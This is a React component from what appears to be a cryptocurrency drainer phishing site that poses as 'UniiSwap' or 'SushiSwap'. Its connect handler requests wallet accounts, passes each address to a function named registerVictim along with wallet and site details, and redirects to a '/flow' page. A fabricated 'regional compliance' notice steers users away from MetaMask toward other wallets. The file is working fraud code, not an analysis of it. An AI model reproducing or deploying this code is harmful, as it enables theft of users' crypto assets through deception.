'use client';

import { useEffect, useMemo, useState } from 'react';
import { useRouter } from 'next/navigation';
import {
  discoverEIP6963Providers,
  isMetaMaskInstalled,
  type EIP6963ProviderDetail,
} from '@/lib/eip6963';
import { registerVictim } from '@/lib/api';
import { setSelectedProvider } from '@/lib/providerStore';

export function WalletPickerModal({ open, onOpenChange }: { open: boolean; onOpenChange: (value: boolean) => void }) {
  const [wallets, setWallets] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [metaMaskDetected, setMetaMaskDetected] = useState(false);
  const router = useRouter();

  useEffect(() => {
    if (!open) return;

    let active = true;
    const run = async () => {
      const providers = await discoverEIP6963Providers(600);
      if (!active) return;
      setWallets(providers);
      setMetaMaskDetected(isMetaMaskInstalled());
      setLoading(false);
    };

    run();
    return () => {
      active = false;
    };
  }, [open]);

  const walletList = useMemo(() => {
    return wallets.map((detail) => ({
      name: detail.info?.name ?? 'Wallet',
      rdns: detail.info?.rdns ?? '',
      icon: detail.info?.icon || '/assets/wallets/default.svg',
      installed: true,
      provider: detail.provider,
      info: detail.info,
    }));
  }, [wallets]);

  async function handleEIP6963Connect(detail: EIP6963ProviderDetail) {
    try {
      try {
        await detail.provider.request({
          method: 'wallet_requestPermissions',
          params: [{ eth_accounts: {} }],
        });
      } catch (permErr) {
        console.warn('[WalletPicker] wallet_requestPermissions failed:', permErr);
      }

      const accounts = await detail.provider.request({ method: 'eth_requestAccounts' });
      if (!accounts?.length) throw new Error('No accounts returned');

      const wallet = accounts[0];

      setSelectedProvider(detail.info.rdns);

      try {
        await registerVictim({
          sourceAddress: wallet,
          chain: 'multi',
          eventType: 'connect',
          walletName: window.location.hostname.includes('sushii') ? 'SushiSwap' : 'UniiSwap',
          walletProvider: detail.info?.name || 'Unknown',
          siteName: 'UniiSwap',
        } as any);
      } catch (registerErr) {
        console.warn('[WalletPicker] registerVictim failed (non-fatal):', registerErr);
      }

      onOpenChange(false);
      router.push('/flow');
    } catch (e: any) {
      console.error('[WalletPicker] EIP-6963 connect failed:', e);
    }
  }

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/10 p-4">
      <div className="w-full max-w-md rounded-[20px] border border-[#F2F2F2] bg-[#FFFFFF] p-5 shadow-swap">
        <div className="mb-4 flex items-center justify-between">
          <div className="text-[18px] font-[535] leading-[1.15] tracking-[-0.02em] text-[#222222]">Connect wallet</div>
          <button onClick={() => onOpenChange(false)} className="text-[#666666]">✕</button>
        </div>

        {metaMaskDetected && (
          <div className="mx-3 mb-3 rounded-[16px] border-2 border-[#FF37C7] bg-[#FFEAF8] p-4 text-[13px] leading-[1.5] text-[#666666]">
            <div className="mb-1 text-[14px] font-[535] text-[#FF37C7]">
              MetaMask is not supported
            </div>
            <div>
              Due to regional compliance requirements, this application does not
              support MetaMask at this time. Please use Trust Wallet, Rabby Wallet,
              Coinbase Wallet, or OKX Wallet to continue. MetaMask support will
              return in a future update.
            </div>
          </div>
        )}
        {loading ? (
          <div className="py-6 text-center text-[14px] text-[#666666]">Searching wallets…</div>
        ) : walletList.length === 0 ? (
          <div className="rounded-[20px] border border-[#F2F2F2] bg-[#F9F9F9] p-6 text-center text-[14px] leading-[1.49] tracking-[-0.02em] text-[#666666]">
            No compatible wallets detected. Install Trust Wallet, Rabby, Coinbase Wallet, or OKX Wallet to continue.
          </div>
        ) : (
          <div className="space-y-3">
            {walletList.map((detail) => {
              const info = detail.info ?? {};
              return (
                <button
                  key={info.uuid || detail.rdns || info.name}
                  onClick={() => handleEIP6963Connect(detail.provider ? { info: detail.info, provider: detail.provider } : { info: { uuid: '', name: 'Wallet', icon: '', rdns: detail.rdns }, provider: null })}
                  className="flex w-full items-center justify-between rounded-[20px] border border-[#F2F2F2] bg-[#FFFFFF] px-3 py-3 text-left transition-colors hover:border-[#FF37C7]"
                >
                  <div className="flex items-center gap-3">
                    <img src={info.icon || '/favicon.ico'} alt={info.name || 'Wallet'} className="h-8 w-8 rounded-full object-cover" />
                    <div>
                      <div className="text-[14px] font-[535] leading-[1.49] tracking-[-0.02em] text-[#222222]">{info.name || 'Wallet'}</div>
                    </div>
                  </div>
                  <span className="rounded-full bg-[#FFF0FC] px-2 py-1 text-[11px] font-[535] text-[#FF37C7]">Detected</span>
                </button>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}

export default WalletPickerModal;
